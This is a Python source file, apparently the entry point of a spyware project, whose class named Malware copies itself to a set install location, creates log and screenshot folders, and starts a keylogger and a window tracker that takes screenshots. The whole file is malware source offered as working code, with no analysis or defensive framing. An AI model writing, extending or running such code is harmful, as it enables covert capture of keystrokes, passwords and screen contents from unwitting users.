from os import path, mkdir
import getpass, sys, shutil
from keylogger import Keylogger
from Screenshot import Screenshot
from WindowTracker import WindowTracker
from FileHandler import FileHandler
from Configuration import Configuration



class Malware:

    def __init__(self):
        self.__config = Configuration()
        self.__buildMalware()
        self.__keylogger = Keylogger(self.__config)
        self.__screenshot = Screenshot(self.__config)
        self.__windowTracker = WindowTracker(self.__config, self.__screenshot)
        self.__keylogger.start()
        self.__windowTracker.start()
      
    

    def __buildMalware(self) -> None:
        if not self.__checkExistence():
            self.__createStructure()    
        elif  self.__config.currentPath.lower() != str(self.__config.filePath + self.__config.fileName).lower():
            sys.exit()



    def __checkExistence(self) -> bool:
        return path.isdir(self.__config.logPath) and path.isfile(self.__config.filePath + self.__config.fileName)



    def __createStructure(self) -> None:
        mkdir(self.__config.logPath)
        mkdir(self.__config.screenshotPath)
        shutil.copy(self.__config.currentPath , self.__config.filePath + self.__config.fileName)




if __name__ == "__main__":
    malware = Malware()